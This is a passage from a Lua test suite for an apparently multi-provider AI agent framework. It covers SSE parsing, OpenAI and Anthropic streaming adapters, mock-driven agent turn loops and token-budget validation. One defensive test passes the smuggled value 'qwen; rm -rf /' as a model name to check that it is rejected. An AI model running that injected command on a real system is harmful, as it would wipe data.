  assert(events[1].event == "message")
  assert(events[1].data == "{\"msg\":\"hello\"}")

  -- 2. Fragmented event across chunk boundaries
  events = {}
  parser:feed("event: update\n", function(evt) table.insert(events, evt) end)
  assert(#events == 0, "no event yet")
  parser:feed("data: line1\n", function(evt) table.insert(events, evt) end)
  assert(#events == 0, "no event yet")
  parser:feed("data: line2\n\n", function(evt) table.insert(events, evt) end)
  assert(#events == 1, "event completed after blank line")
  assert(events[1].event == "update")
  assert(events[1].data == "line1\nline2")

  -- 3. Multiple events in a single chunk with comments
  events = {}
  local multi_chunk = ": keep-alive comment\nevent: first\ndata: 1\n\n: another comment\nevent: second\ndata: 2\n\n"
  parser:feed(multi_chunk, function(evt)
    table.insert(events, evt)
  end)
  assert(#events == 2, "must parse two events from single chunk")
  assert(events[1].event == "first" and events[1].data == "1")
  assert(events[2].event == "second" and events[2].data == "2")

  -- 4. [DONE] token
  events = {}
  parser:feed("data: [DONE]\n\n", function(evt)
    table.insert(events, evt)
  end)
  assert(#events == 1)
  assert(events[1].data == "[DONE]")
end)

run_test("WheelProvider: tool formatters and adapter factory", function()
  local tools = {
    {
      name = "read_file",
      description = "Read a file from workspace",
      parameters = {
        type = "object",
        properties = { path = { type = "string" } },
        required = { "path" },
      },
    },
    {
      name = "run_command",
      description = "Execute a shell command",
      parameters = {
        type = "object",
        properties = { command = { type = "string" } },
      },
    },
  }

  -- 1. OpenAI formatting
  local oai = WheelProvider.format_tools_for_openai(tools)
  assert(#oai == 2, "must format 2 tools for openai")
  assert(oai[1].type == "function")
  assert(oai[1]["function"].name == "read_file")
  assert(oai[1]["function"].parameters.type == "object")

  -- 2. Anthropic formatting
  local anth = WheelProvider.format_tools_for_anthropic(tools)
  assert(#anth == 2, "must format 2 tools for anthropic")
  assert(anth[1].name == "read_file")
  assert(anth[1].input_schema.type == "object")

  -- 3. Factory creation
  local mock_p = WheelProvider.create({ provider = "mock", model = "test-mock" })
  assert(mock_p.name == "mock")
  assert(mock_p:describe().model == "test-mock")

  local oai_p = WheelProvider.create({ provider = "openai", model = "gpt-4o" }, { api_key = "test-key" })
  assert(oai_p.name == "openai")
  assert(oai_p.base_url == "https://api.openai.com/v1")

  local dseek_p = WheelProvider.create({ provider = "deepseek", model = "deepseek-reasoner" })
  assert(dseek_p.name == "openai")
  assert(dseek_p.base_url == "https://api.deepseek.com/v1")

  local cl_p = WheelProvider.create({ provider = "anthropic", model = "claude-3-5-sonnet" }, { api_key = "ant-key" })
  assert(cl_p.name == "anthropic")
  assert(cl_p.base_url == "https://api.anthropic.com/v1")

  local stdio_p = WheelProvider.create({ provider = "local", model = "qwen2.5-coder" })
  assert(stdio_p.name == "stdio")
  assert(type(stdio_p.command) == "table")
  assert(table.concat(stdio_p.command, " ") == "ollama run qwen2.5-coder",
    "the stdio factory must produce an argv command")
end)

run_test("WheelProvider.MockProvider: completions, streaming chunks, and tool calling", function()
  local mock = WheelProvider.MockProvider.new({
    stream_chunk_size = 5,
    responses = {
      {
        content = "First answer",
        thinking_content = "Thinking step 1",
        tool_calls = {
          { id = "tc_1", name = "read_file", arguments = { path = "foo.lua" } },
        },
        usage = { prompt_tokens = 50, completion_tokens = 20, thinking_tokens = 10, total_tokens = 80 },
        finish_reason = "tool_calls",
      },
      {
        content = "Second final answer",
        tool_calls = {},
        finish_reason = "stop",
      },
    },
  })

  -- 1. Stream first response
  local chunks = {}
  local res1, err1 = mock:stream({ messages = { { role = "user", content = "hi" } } }, function(chunk)
    table.insert(chunks, chunk)
  end)

  assert(err1 == nil)
  assert(res1.content == "First answer")
  assert(res1.thinking_content == "Thinking step 1")
  assert(#res1.tool_calls == 1)
  assert(res1.tool_calls[1].name == "read_file")
  assert(#chunks > 0, "must stream chunks")

  -- Verify chunk types emitted
  local has_thinking = false
  local has_content = false
  local has_tool_call = false
  for _, c in ipairs(chunks) do
    if c.type == "thinking" then has_thinking = true end
    if c.type == "content" then has_content = true end
    if c.type == "tool_call" then has_tool_call = true end
  end
  assert(has_thinking == true, "must emit thinking chunks")
  assert(has_content == true, "must emit content chunks")
  assert(has_tool_call == true, "must emit tool_call chunks")

  -- 2. Stream second response
  local res2, err2 = mock:stream({ messages = { { role = "user", content = "next" } } })
  assert(err2 == nil)
  assert(res2.content == "Second final answer")
  assert(res2.finish_reason == "stop")
  assert(mock:describe().call_count == 2)
end)

run_test("WheelProvider: OpenAI and Anthropic protocol adapters with streaming SSE", function()
  -- 1. Test OpenAIAdapter with mocked HTTP client emitting SSE stream
  local mock_http_openai = function(req)
    assert(req.method == "POST")
    assert(string.find(req.url, "/chat/completions", 1, true) ~= nil)
    assert(req.headers["Authorization"] == "Bearer mock-token")

    local chunks = {
      "data: {\"choices\":[{\"delta\":{\"reasoning_content\":\"DeepSeek reasoner thinking...\"}}]}\n\n",
      "data: {\"choices\":[{\"delta\":{\"content\":\"Hello \",\"tool_calls\":[{\"index\":0,\"id\":\"call_01\",\"function\":{\"name\":\"search_code\",\"arguments\":\"{\\\"pattern\\\"\"}}]}}]}\n\n",
      "data: {\"choices\":[{\"delta\":{\"content\":\"world!\",\"tool_calls\":[{\"index\":0,\"function\":{\"arguments\":\":\\\"main\\\"}\"}}]}}]}\n\n",
      "data: {\"choices\":[{\"finish_reason\":\"tool_calls\"}],\"usage\":{\"prompt_tokens\":10,\"completion_tokens\":15,\"total_tokens\":25}}\n\n",
      "data: [DONE]\n\n",
    }

    if req.stream and req.on_stream_chunk then
      for _, ch in ipairs(chunks) do
        req.on_stream_chunk(ch)
      end
    end
    return { status = 200, body = "" }
  end

  local oai_adapter = WheelProvider.OpenAIAdapter.new({
    api_key = "mock-token",
    http_client = mock_http_openai,
  })

  local stream_tokens = {}
  local oai_res, oai_err = oai_adapter:stream({
    messages = { { role = "user", content = "Test query" } },
    tools = { { name = "search_code", description = "search", parameters = { type = "object" } } },
  }, function(chunk)
    table.insert(stream_tokens, chunk.delta)
  end)

  assert(oai_err == nil, "stream must succeed: " .. tostring(oai_err))
  assert(oai_res.content == "Hello world!", "accumulated content must match")
  assert(oai_res.thinking_content == "DeepSeek reasoner thinking...", "reasoning content parsed")
  assert(#oai_res.tool_calls == 1, "tool call parsed")
  assert(oai_res.tool_calls[1].name == "search_code")
  assert(oai_res.tool_calls[1].arguments.pattern == "main")
  assert(oai_res.finish_reason == "tool_calls")
  assert(oai_res.usage.total_tokens == 25)

  -- 2. Test AnthropicAdapter with mocked HTTP client emitting Anthropic SSE events
  local mock_http_anthropic = function(req)
    assert(req.method == "POST")
    assert(string.find(req.url, "/messages", 1, true) ~= nil)
    assert(req.headers["x-api-key"] == "ant-token")
    assert(req.headers["anthropic-version"] == "2023-06-01")

    local events = {
      "event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_1\",\"role\":\"assistant\",\"usage\":{\"input_tokens\":40}}}\n\n",
      "event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"thinking\",\"thinking\":\"\"}}\n\n",
      "event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"thinking_delta\",\"thinking\":\"Claude thinking process\"}}\n\n",
      "event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
      "event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":1,\"content_block\":{\"type\":\"text\",\"text\":\"\"}}\n\n",
      "event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":1,\"delta\":{\"type\":\"text_delta\",\"text\":\"Implementation ready.\"}}\n\n",
      "event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":1}\n\n",
      "event: message_delta\ndata: {\"type\":\"message_delta\",\"delta\":{\"stop_reason\":\"end_turn\"},\"usage\":{\"output_tokens\":20}}\n\n",
      "event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
    }

    if req.stream and req.on_stream_chunk then
      for _, ev in ipairs(events) do
        req.on_stream_chunk(ev)
      end
    end
    return { status = 200, body = "" }
  end

  local ant_adapter = WheelProvider.AnthropicAdapter.new({
    api_key = "ant-token",
    http_client = mock_http_anthropic,
  })

  local ant_res, ant_err = ant_adapter:stream({
    messages = {
      { role = "system", content = "You are a software engineer." },
      { role = "user", content = "Write the function" },
    },
  })

  assert(ant_err == nil, "anthropic stream must succeed: " .. tostring(ant_err))
  assert(ant_res.content == "Implementation ready.")
  assert(ant_res.thinking_content == "Claude thinking process")
  assert(ant_res.finish_reason == "end_turn")
  assert(ant_res.usage.output_tokens == 20)
end)

run_test("WheelRunner: autonomous ReAct turn loop with tool calling and checkpointing", function()
  local kernel = WheelKernel.new_mock()
  local context = WheelContext.new({ kernel = kernel })
  local registry = WheelTool.Registry.new()

  -- Register test file tools with dummy execution
  registry:register_tool({
    name = "inspect_file",
    intent = WheelTool.ActionIntent.INSPECT,
    description = "Inspect file content",
    execute = function(args, env)
      return { success = true, exit_code = 0, stdout = "pub fn test_core() -> bool { true }" }
    end,
  })

  -- Create agent with registered tools
  local agent = WheelAgent.new({
    name = "worker-coding-01",
    role = WheelAgent.Role.CODING,
    kernel = kernel,
    context = context,
    tool_registry = registry,
    tools = { "inspect_file", "read_file", "write_file" },
  })

  -- Program MockProvider with multi-turn responses:
  -- Turn 1: Model issues tool call to inspect_file
  -- Turn 2: Model finishes with final deliverables
  local mock = WheelProvider.MockProvider.new({
    responses = {
      {
        content = "Inspecting source code first",
        thinking_content = "Need to check test_core() definition",
        tool_calls = {
          { id = "tc_inspect_1", name = "inspect_file", arguments = { path = "src/lib.rs" } },
        },
        usage = { prompt_tokens = 100, completion_tokens = 30, thinking_tokens = 15, total_tokens = 145 },
      },
      {
        content = "Verified test_core() implementation successfully. All tests passing.",
        thinking_content = "Verification confirmed. Preparing final delivery.",
        tool_calls = {},
        finish_reason = "stop",
        usage = { prompt_tokens = 150, completion_tokens = 25, thinking_tokens = 10, total_tokens = 185 },
      },
    },
  })
  agent:set_provider(mock)

  -- Create task in kernel
  local task = kernel:create_task({
    id = "T-REACT-01",
    title = "Verify core subsystem",
    description = "Inspect core function implementation",
    priority = 8,
  })

  local tokens_streamed = {}
  local tools_called = {}
  local tools_resulted = {}

  local runner_res = WheelRunner.run_task(agent, task, {
    max_turns = 5,
    on_token = function(token, kind)
      table.insert(tokens_streamed, token)
    end,
    on_tool_call = function(tc)
      table.insert(tools_called, tc.name)
    end,
    on_tool_result = function(tc, outcome)
      table.insert(tools_resulted, outcome.success)
    end,
  })

  assert(runner_res.success == true, "runner execution must succeed: " .. tostring(runner_res.error))
  assert(runner_res.iterations == 2, "must complete in exactly 2 turns")
  assert(#tools_called == 1 and tools_called[1] == "inspect_file", "tool called in turn 1")
  assert(#tools_resulted == 1 and tools_resulted[1] == true, "tool executed successfully")
  assert(#tokens_streamed > 0, "tokens streamed to callback")
  assert(#runner_res.checkpoints >= 2, "checkpoints committed per turn")
  assert(runner_res.usage.total_tokens == 330, "usage telemetry accumulated across turns")

  -- Verify artifacts written to semantic slot
  local art_slot = context:get_slot("tasks/" .. task.id .. "/artifacts")
  assert(art_slot.found == true, "artifacts slot must be created in context")
  assert(string.find(art_slot.content, "Verified test_core()", 1, true) ~= nil)
end)

run_test("WheelAgent: execute_task integration with WheelRunner and telemetry", function()
  local kernel = WheelKernel.new_mock()
  local context = WheelContext.new({ kernel = kernel })

  local agent = WheelAgent.new({
    name = "worker-coding-02",
    role = WheelAgent.Role.CODING,
    kernel = kernel,
    context = context,
    model_profile = {
      provider = "mock",
      model = "claude-3-5-sonnet",
      temperature = 0.0,
      thinking = { enabled = true, budget_tokens = 2048 },
    },
  })

  -- Set mock provider returning direct completion
  local mock = WheelProvider.MockProvider.new({
    responses = {
      {
        content = "Direct autonomous code delivery for task.",
        thinking_content = "Analyzed specifications and completed code.",
        tool_calls = {},
        finish_reason = "stop",
        usage = { prompt_tokens = 80, completion_tokens = 30, total_tokens = 110 },
      },
    },
  })
  agent:set_provider(mock)

  local task = kernel:create_task({
    id = "T-AUTO-01",
    title = "Implement helper module",
    description = "Create helper functions",
    priority = 5,
  })

  -- Call execute_task with NO step_fn (defaults to autonomous WheelRunner!)
  local outcome = agent:execute_task(task.id)

  assert(outcome.success == true, "autonomous execute_task must succeed")
  assert(outcome.iterations == 1, "completed in 1 iteration")
  assert(#outcome.checkpoints >= 1, "checkpoint committed")
  assert(string.find(outcome.artifacts, "Direct autonomous", 1, true) ~= nil)

  -- Verify status telemetry contains provider and model profile
  local st = agent:status()
  assert(st.provider ~= nil, "status must report provider")
  assert(st.provider.provider == "mock")
  assert(st.model_profile.provider == "mock")
  assert(st.model_profile.thinking.enabled == true)
end)

run_test("WheelTeam: run_orchestration_loop with autonomous provider runner and models command", function()
  local kernel = WheelKernel.new_mock()
  local context = WheelContext.new({ kernel = kernel })
  local team = WheelTeam.new({ kernel = kernel, context = context })

  -- Spawn coding worker and reviewer
  local worker = team:spawn_agent({
    name = "worker-01",
    role = WheelAgent.Role.CODING,
    model_profile = { provider = "mock", model = "claude-3-5-sonnet" },
  })
  local reviewer = team:spawn_agent({
    name = "reviewer-01",
    role = WheelAgent.Role.REVIEWER,
    model_profile = { provider = "mock", model = "gpt-4o" },
  })

  -- Configure mock providers on worker
  local worker_mock = WheelProvider.MockProvider.new({
    completion_fn = function(req, count)
      return {
        content = "Code implementation for task iteration " .. count,
        thinking_content = "Engineering rationale for step " .. count,
        tool_calls = {},
        finish_reason = "stop",
      }
    end,
  })
  worker:set_provider(worker_mock)

  -- Decompose 2-task linear plan
  local t1 = kernel:create_task({ id = "T-PIPE-01", title = "Setup architecture", priority = 10 })
  local t2 = kernel:create_task({ id = "T-PIPE-02", title = "Implement features", priority = 8, dependencies = { t1.id } })

  -- Run orchestration loop with autonomous runner enabled!
  local report = team:run_orchestration_loop({
    use_runner = true,
    max_waves = 5,
    auto_reviewer = true,
  })

  assert(report.success == true, "autonomous wave orchestration must succeed: " .. tostring(report.blocked_reason))
  assert(#report.completed_tasks == 2, "both tasks completed")
  assert(report.total_handoffs == 2, "2 verification handoffs completed")
  assert(report.waves_executed == 2, "2 waves executed")

  -- Verify plugin models command registration and formatting
  package.loaded["wheel.init"] = nil
  package.loaded["lua.wheel.init"] = nil

  local registered_commands = {}
  local notifications = {}
  _G.bitty = {
    commands = {
      register = function(def) registered_commands[def.id] = def; return 1 end,
    },
    notify = {
      show = function(n) table.insert(notifications, n); return true end,
    },
  }

  local wheel = require("wheel.init")
  assert(registered_commands["models"] ~= nil, "models command must be registered")
  assert(registered_commands["models"].title == "Wheel: models")

  registered_commands["models"].run()
  assert(#notifications > 0, "notification must be emitted")
  local notif = notifications[#notifications]
  assert(notif.title == "Wheel Models")
  assert(string.find(notif.body, "claude-3-5-sonnet", 1, true) ~= nil)
  assert(string.find(notif.body, "deepseek-reasoner", 1, true) ~= nil)
  assert(string.find(notif.body, "gpt-4o", 1, true) ~= nil)

  _G.bitty = nil
end)

-- ---------------------------------------------------------------------------
-- Section 18: Provider Protocol Compliance & Error Boundaries
-- ---------------------------------------------------------------------------

run_test("WheelProvider.SSEParser: buffer limits and StdioAdapter prompt stdin pipe", function()
  -- 1. SSEParser buffer limit (>1 MiB unterminated chunk)
  local parser = WheelProvider.SSEParser.new({ max_buffer_size = 100 })
  local big_chunk = string.rep("x", 120) -- no newline
  local ok, err = parser:feed(big_chunk)
  assert(ok == nil, "must fail when unterminated chunk exceeds limit")
  assert(string.find(err, "exceeds maximum buffer length", 1, true) ~= nil, "error message must report buffer limit")
  assert(parser.buffer == "", "parser buffer must be reset on overflow")

  -- 2. StdioAdapter with mock runner receiving formatted prompt
  local captured_cmd, captured_prompt
  local stdio = WheelProvider.StdioAdapter.new({
    command = "mock_model_cli",
    runner = function(cmd, prompt)
      captured_cmd = cmd
      captured_prompt = prompt
      return "mock CLI output"
    end,
  })

  local res, err = stdio:complete({
    messages = {
      { role = "user", content = "hello stdio" },
    },
  })
  assert(res ~= nil, "stdio complete must succeed with runner")
  assert(res.content == "mock CLI output")
  assert(captured_cmd == "mock_model_cli")
  assert(string.find(captured_prompt, "hello stdio", 1, true) ~= nil, "runner must receive prompt")
end)

run_test("WheelProvider: OpenAI & Anthropic wire format, status check, and error stream rejection", function()
  -- 1. OpenAI format: assistant tool_calls converted to OpenAI wire schema
  local oai = WheelProvider.OpenAIAdapter.new({
    api_key = "test-key",
  })

  local req = {
    messages = {
      {
        role = "assistant",
        content = "calling tool",
        tool_calls = {
          { id = "call_123", name = "read_file", arguments = { path = "foo.txt" } },
        },
      },
    },
  }
  local payload = oai:_format_payload(req, false)
  assert(payload.messages[1].tool_calls ~= nil)
  local tc = payload.messages[1].tool_calls[1]
  assert(tc.id == "call_123")
  assert(tc.type == "function")
  assert(tc["function"].name == "read_file")
  assert(string.find(tc["function"].arguments, "foo.txt", 1, true) ~= nil, "arguments must be JSON string")

  -- 2. OpenAI HTTP non-2xx rejection with truncated preview
  local bad_http_oai = WheelProvider.OpenAIAdapter.new({
    http_client = function(req)
      return { status = 401, body = string.rep("unauthorized_error_", 50) }
    end,
  })
  local res, err = bad_http_oai:complete(req)
  assert(res == nil, "complete must fail on HTTP 401")
  assert(string.find(err, "HTTP 401 error:", 1, true) ~= nil)
  assert(#err <= 600, "error string preview must be bounded")

  local s_res, s_err = bad_http_oai:stream(req, function() end)
  assert(s_res == nil, "stream must fail on HTTP 401")
  assert(string.find(s_err, "HTTP 401 streaming error:", 1, true) ~= nil)

  -- 3. Anthropic format: tool_use in assistant message, grouped tool_results in user message
  local ant = WheelProvider.AnthropicAdapter.new({
    api_key = "ant-key",
  })
  local ant_req = {
    messages = {
      {
        role = "assistant",
        content = "I will read two files",
        tool_calls = {
          { id = "tool_1", name = "read_file", arguments = { path = "a.txt" } },
          { id = "tool_2", name = "read_file", arguments = { path = "b.txt" } },
        },
      },
      { role = "tool", tool_call_id = "tool_1", content = "content a" },
      { role = "tool", tool_call_id = "tool_2", content = "content b" },
    },
  }
  local ant_payload = ant:_format_payload(ant_req, false)
  -- Assistant message has text block + 2 tool_use blocks
  local asst_msg = ant_payload.messages[1]
  assert(asst_msg.role == "assistant")
  assert(#asst_msg.content == 3)
  assert(asst_msg.content[1].type == "text")
  assert(asst_msg.content[2].type == "tool_use")
  assert(asst_msg.content[2].id == "tool_1")
  assert(asst_msg.content[3].type == "tool_use")
  assert(asst_msg.content[3].id == "tool_2")

  -- Tool messages grouped into a single user message
  local user_msg = ant_payload.messages[2]
  assert(user_msg.role == "user")
  assert(#user_msg.content == 2, "consecutive tool results must be grouped into single user message")
  assert(user_msg.content[1].type == "tool_result")
  assert(user_msg.content[1].tool_use_id == "tool_1")
  assert(user_msg.content[2].type == "tool_result")
  assert(user_msg.content[2].tool_use_id == "tool_2")

  -- 4. Anthropic SSE error event handling
  local error_stream_ant = WheelProvider.AnthropicAdapter.new({
    http_client = function(req)
      if req.stream and req.on_stream_chunk then
        req.on_stream_chunk("event: error\ndata: {\"error\":{\"type\":\"overloaded_error\",\"message\":\"Server overloaded\"}}\n\n")
      end
      return { status = 200, body = "" }
    end,
  })
  local ant_s_res, ant_s_err = error_stream_ant:stream(ant_req, function() end)
  assert(ant_s_res == nil, "stream must fail when Anthropic emits error event")
  assert(string.find(ant_s_err, "Server overloaded", 1, true) ~= nil, "error message must capture Anthropic error")

  -- 5. Parser buffer overflow propagation in streaming
  local overflow_oai = WheelProvider.OpenAIAdapter.new({
    http_client = function(req)
      if req.stream and req.on_stream_chunk then
        -- Send chunk larger than 1 MiB without newline
        req.on_stream_chunk(string.rep("A", 1048577))
      end
      return { status = 200, body = "" }
    end,
  })
  local ov_res, ov_err = overflow_oai:stream(req, function() end)
  assert(ov_res == nil, "stream must fail on parser buffer overflow")
  assert(string.find(ov_err, "SSE line exceeds maximum buffer length", 1, true) ~= nil)
end)

run_test("WheelProvider.create: strict validation, injection rejection, and no mock fallback", function()
  -- 1. Unknown provider type fails closed
  local p, err = WheelProvider.create({ provider = "nonexistent_provider" })
  assert(p == nil, "create must return nil for unknown provider")
  assert(string.find(err, "Unknown or unsupported provider type", 1, true) ~= nil)

  -- 2. Local provider rejects shell injection in model name
  local p_inj, err_inj = WheelProvider.create({ provider = "local", model = "qwen; rm -rf /" })
  assert(p_inj == nil, "create must reject shell injection in model name")
  assert(string.find(err_inj, "Invalid model name", 1, true) ~= nil)

  -- 3. opts.command non-string validation
  local p_cmd, err_cmd = WheelProvider.create({ provider = "local" }, { command = 12345 })
  assert(p_cmd == nil, "create must reject non-string command")
  assert(string.find(err_cmd, "must be a string", 1, true) ~= nil)

  -- 4. Completion budget override is validated before adapter creation
  local p_budget, err_budget = WheelProvider.create(
    { provider = "openai", model = "gpt-4o", max_completion_tokens = 0 },
    { api_key = "test-key" }
  )
  assert(p_budget == nil, "create must reject a zero completion budget")
  assert(type(err_budget) == "table", "completion budget rejection must be typed")
  assert(err_budget.code == WheelErrors.E_COMPLETION_BUDGET_INVALID)

  -- 5. A valid config override reaches the adapter; an absent override uses the default
  local configured_p = WheelProvider.create(
    { provider = "openai", model = "gpt-4o", max_completion_tokens = 1024 },
    { api_key = "test-key" }
  )
  assert(configured_p ~= nil)
  assert(configured_p.max_completion_tokens == 1024)

  local default_p = WheelProvider.create({ provider = "openai", model = "gpt-4o" }, { api_key = "test-key" })
  assert(default_p ~= nil)
  assert(default_p.max_completion_tokens == WheelProvider.DEFAULT_MAX_COMPLETION_TOKENS)
end)

run_test("WheelProvider: completion-token budget default and typed validation", function()
  local DEFAULT = WheelProvider.DEFAULT_MAX_COMPLETION_TOKENS
  local MAX = WheelProvider.MAX_COMPLETION_TOKENS

  -- One named default, bounded and positive: never an unbounded provider default.
  assert(DEFAULT == 4096, "named default completion budget must be 4096")
  assert(MAX == 32768, "completion budget hard bound must be 32768")
  assert(DEFAULT > 0 and DEFAULT <= MAX, "default must be a bounded positive budget")

  local value, err = WheelProvider.validate_max_completion_tokens(nil)
  assert(value == DEFAULT and err == nil, "nil must resolve to the named default")

  for _, valid in ipairs({ 1, 256, 4096, MAX }) do
    local v, e = WheelProvider.validate_max_completion_tokens(valid)
    assert(v == valid and e == nil, "valid budget must pass: " .. tostring(valid))
  end

  local invalid_values = {
    0,
    -1,
    -MAX,
    1.5,
    0 / 0,
    math.huge,
    -math.huge,
    "256",
    true,
    {},
    MAX + 1,
  }
  for _, invalid in ipairs(invalid_values) do
    local v, e = WheelProvider.validate_max_completion_tokens(invalid)
    assert(v == nil, "invalid budget must be rejected: " .. tostring(invalid))
    assert(type(e) == "table", "invalid budget must return a typed error")
    assert(e.class == "validation" and e.code == WheelErrors.E_COMPLETION_BUDGET_INVALID)
    assert(WheelErrors.is_typed(e), "budget error must match the typed bridge shape")
  end

  -- Resolution precedence: request override, legacy request field, config, default.
  local resolved = WheelProvider.resolve_max_completion_tokens({
    max_completion_tokens = 128,
    max_tokens = 64,
  }, 1024)
  assert(resolved == 128, "request override must win")

  resolved = WheelProvider.resolve_max_completion_tokens({ max_tokens = 64 }, 1024)
  assert(resolved == 64, "legacy request field must be accepted")

  resolved = WheelProvider.resolve_max_completion_tokens({}, 1024)
  assert(resolved == 1024, "config override must apply when the request is silent")

  resolved = WheelProvider.resolve_max_completion_tokens({}, nil)
  assert(resolved == DEFAULT, "named default must apply when no override exists")
end)

run_test("WheelProvider.OpenAIAdapter: bounded max_tokens on complete and stream", function()
  local DEFAULT = WheelProvider.DEFAULT_MAX_COMPLETION_TOKENS
  local captured = {}

  local function client(response_body)
    return function(req)
      table.insert(captured, WheelProvider.JSON.decode(req.body))
      if req.stream and req.on_stream_chunk then
        req.on_stream_chunk("data: [DONE]\n\n")
      end
      return { status = 200, body = response_body }
    end
  end

  local completion_body = '{"choices":[{"message":{"content":"ok"},"finish_reason":"stop"}],"usage":{"total_tokens":3}}'
  local adapter = WheelProvider.OpenAIAdapter.new({
    http_client = client(completion_body),
  })

  -- 1. Default applied to complete.
  local res, err = adapter:complete({ messages = { { role = "user", content = "hi" } } })
  assert(res ~= nil and err == nil, "complete must succeed: " .. tostring(err))
  assert(captured[1].max_tokens == DEFAULT, "complete must carry the named default")

  -- 2. Default applied to stream.
  local sres, serr = adapter:stream({ messages = { { role = "user", content = "hi" } } }, function() end)
  assert(sres ~= nil and serr == nil, "stream must succeed: " .. tostring(serr))
  assert(captured[2].max_tokens == DEFAULT, "stream must carry the named default")

  -- 3. Valid explicit request override.
  res, err = adapter:complete({
    messages = { { role = "user", content = "hi" } },
    max_completion_tokens = 256,
  })
  assert(res ~= nil and err == nil)
  assert(captured[3].max_tokens == 256, "explicit override must be serialized")

  -- 4. Adapter-level config override, then request override wins.
  local configured = WheelProvider.OpenAIAdapter.new({
    max_completion_tokens = 1024,
    http_client = client(completion_body),
  })
  local before = #captured
  res = configured:complete({ messages = { { role = "user", content = "hi" } } })
  assert(res ~= nil)
  assert(captured[before + 1].max_tokens == 1024, "adapter override must be serialized")
  res = configured:complete({
    messages = { { role = "user", content = "hi" } },
    max_completion_tokens = 512,
  })
  assert(res ~= nil)
  assert(captured[before + 2].max_tokens == 512, "request override must beat adapter config")

  -- 5. Invalid overrides are rejected before any HTTP request is sent.
  local sent = #captured
  for _, invalid in ipairs({ 0, -1, 1.5, "256", true, WheelProvider.MAX_COMPLETION_TOKENS + 1 }) do
    local bad_res, bad_err = adapter:complete({
      messages = { { role = "user", content = "hi" } },
      max_completion_tokens = invalid,
    })
    assert(bad_res == nil, "invalid complete budget must fail")
    assert(type(bad_err) == "table" and bad_err.code == WheelErrors.E_COMPLETION_BUDGET_INVALID)

    local bad_sres, bad_serr = adapter:stream({
      messages = { { role = "user", content = "hi" } },
      max_completion_tokens = invalid,
    }, function() end)
    assert(bad_sres == nil, "invalid stream budget must fail")
    assert(type(bad_serr) == "table" and bad_serr.code == WheelErrors.E_COMPLETION_BUDGET_INVALID)
  end
  assert(#captured == sent, "invalid overrides must not reach the HTTP client")
end)

run_test("WheelProvider.AnthropicAdapter: bounded max_tokens and typed rejection", function()
  local DEFAULT = WheelProvider.DEFAULT_MAX_COMPLETION_TOKENS
  local captured = {}

  local anthropic = WheelProvider.AnthropicAdapter.new({
    api_key = "ant-token",
    http_client = function(req)
      table.insert(captured, WheelProvider.JSON.decode(req.body))
      return {
        status = 200,
        body = '{"content":[{"type":"text","text":"ok"}],"stop_reason":"end_turn","usage":{}}',
      }
    end,
  })

  local res, err = anthropic:complete({ messages = { { role = "user", content = "hi" } } })
  assert(res ~= nil and err == nil, "anthropic complete must succeed: " .. tostring(err))
  assert(captured[1].max_tokens == DEFAULT, "anthropic requests must carry the named default")

  res = anthropic:complete({
    messages = { { role = "user", content = "hi" } },
    max_completion_tokens = 256,
  })
  assert(res ~= nil)
  assert(captured[2].max_tokens == 256, "anthropic request override must be serialized")

  -- Anthropic stream path: the SSE request payload must carry the bound too.
  local stream_captured = {}
  local streaming = WheelProvider.AnthropicAdapter.new({
    api_key = "ant-token",
    http_client = function(req)
      table.insert(stream_captured, WheelProvider.JSON.decode(req.body))
      if req.stream and req.on_stream_chunk then
        req.on_stream_chunk("event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n")
      end
      return { status = 200, body = "" }
    end,
  })

  local sres, serr = streaming:stream({
    messages = { { role = "user", content = "hi" } },
    max_completion_tokens = 768,
  }, function() end)
  assert(sres ~= nil and serr == nil, "anthropic stream must succeed: " .. tostring(serr))
  assert(stream_captured[1].stream == true, "anthropic stream payload must set stream=true")
  assert(stream_captured[1].max_tokens == 768, "anthropic stream payload must carry the override")

  sres, serr = streaming:stream({
    messages = { { role = "user", content = "hi" } },
  }, function() end)
  assert(sres ~= nil and serr == nil, "anthropic default stream must succeed: " .. tostring(serr))
  assert(stream_captured[2].max_tokens == DEFAULT, "anthropic stream payload must carry the default")

  local bad_res, bad_err = anthropic:complete({
    messages = { { role = "user", content = "hi" } },
    max_completion_tokens = 0,
  })
  assert(bad_res == nil)
  assert(type(bad_err) == "table" and bad_err.code == WheelErrors.E_COMPLETION_BUDGET_INVALID)
end)

run_test("WheelRunner: completion budget reaches complete, stream, and mock requests", function()
  local DEFAULT = WheelProvider.DEFAULT_MAX_COMPLETION_TOKENS
  local kernel = WheelKernel.new_mock()

  -- 1. MockProvider captures the bound on both request paths.
  local direct_mock = WheelProvider.MockProvider.new({
    responses = {
      { content = "complete" },
      { content = "stream" },
    },
  })
  direct_mock:complete({ messages = {}, max_completion_tokens = 256 })
  direct_mock:stream({ messages = {}, max_completion_tokens = 512 }, function() end)
  assert(direct_mock.call_history[1].max_completion_tokens == 256)
  assert(direct_mock.call_history[2].max_completion_tokens == 512)

  -- 2. Runner uses the model-profile override.
  local override_agent = WheelAgent.new({
    name = "budget-override-worker",
    role = WheelAgent.Role.CODING,
    kernel = kernel,
    model_profile = {
      provider = "mock",
      model = "mock-model",
      temperature = 0.0,
      max_completion_tokens = 1234,
    },
  })
  local override_mock = WheelProvider.MockProvider.new({
    responses = { { content = "done" } },
  })
  override_agent:set_provider(override_mock)
  local task1 = kernel:create_task({ id = "T-BUDGET-01", title = "Budget override" })
  local report1 = WheelRunner.run_task(override_agent, task1)
  assert(report1.success == true, "runner must succeed: " .. tostring(report1.error))
  assert(override_mock.call_history[1].max_completion_tokens == 1234)

  -- 3. Runner uses the named default when no override exists.
  local default_agent = WheelAgent.new({
    name = "budget-default-worker",
    role = WheelAgent.Role.CODING,
    kernel = kernel,
    model_profile = { provider = "mock", model = "mock-model", temperature = 0.0 },
  })
  local default_mock = WheelProvider.MockProvider.new({
    responses = { { content = "done" } },
  })
  default_agent:set_provider(default_mock)
  local task2 = kernel:create_task({ id = "T-BUDGET-02", title = "Budget default" })
  local report2 = WheelRunner.run_task(default_agent, task2)
